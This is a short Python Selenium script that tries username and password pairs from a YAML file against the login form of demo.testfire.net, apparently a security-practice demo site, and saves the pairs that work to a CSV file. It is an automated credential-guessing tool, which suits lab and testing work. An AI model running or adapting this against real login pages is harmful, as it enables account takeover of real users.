from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import yaml
import pandas as pd
import sys

users_data = yaml.safe_load(open("details.yml"))
driver = webdriver.Chrome()
user_cred = []
pass_cred = []

def login(url,usernameId,username,passwordId,password,submit_buttonId,user_cred,pass_cred):
    driver.get(url)
    driver.find_element(By.ID,usernameId).send_keys(username)
    driver.find_element(By.ID,passwordId).send_keys(password)
    driver.find_element(By.NAME,submit_buttonId).click()
    try:
        WebDriverWait(driver,0.1).until(EC.presence_of_element_located((By.ID, "btnGetAccount")))
        user_cred.append(username)
        pass_cred.append(password)
    except Exception as e:
        print()

for i in range(0,len(users_data['username'])):
    username = users_data['username'][i]
    password = users_data['password'][i]
    login("https://demo.testfire.net/login.jsp", "uid", username, "passw", password, "btnSubmit",user_cred,pass_cred)
df=pd.DataFrame({"Username": user_cred,"Password":pass_cred})
df.to_csv("credentials.csv", mode='w+', sep=',', encoding='utf-8', index=False,header = True)
sys.exit()